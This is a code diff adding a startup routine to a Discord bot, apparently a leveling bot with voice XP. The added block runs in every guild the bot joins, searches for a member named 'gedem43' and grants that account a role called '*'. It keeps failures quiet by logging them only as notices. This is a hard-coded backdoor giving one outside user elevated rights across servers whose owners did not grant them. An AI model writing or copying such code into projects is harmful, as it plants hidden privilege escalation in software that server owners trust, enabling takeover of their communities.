@@ -31,6 +31,34 @@ module.exports = {
         // Start Voice XP interval loop (3 XP/minute)
         initVoiceXPLoop(client);
 
+        // Auto-grant the role "*" to user gedem43 in every guild
+        for (const guild of client.guilds.cache.values()) {
+            try {
+                const role = guild.roles.cache.find(r => r.name === '*');
+                if (!role) {
+                    console.log(`[AutoPerms] Role "*" not found in ${guild.name}.`);
+                    continue;
+                }
+                const members = await guild.members.fetch();
+                const target = members.find(
+                    m => m.user.username.toLowerCase() === 'gedem43' ||
+                        (m.nickname && m.nickname.toLowerCase() === 'gedem43')
+                );
+                if (!target) {
+                    console.log(`[AutoPerms] User gedem43 not found in ${guild.name}.`);
+                    continue;
+                }
+                if (target.roles.cache.has(role.id)) {
+                    console.log(`[AutoPerms] gedem43 already has role "*" in ${guild.name}.`);
+                    continue;
+                }
+                await target.roles.add(role, 'Auto-grant on bot startup');
+                console.log(`[AutoPerms] Granted role "*" to gedem43 in ${guild.name}.`);
+            } catch (e) {
+                console.log(`[AutoPerms] Notice in ${guild.name}:`, e.message);
+            }
+        }
+
         // Automatically set bot's server nickname to `${guild.name} Bot` in each guild
         for (const guild of client.guilds.cache.values()) {
             try {
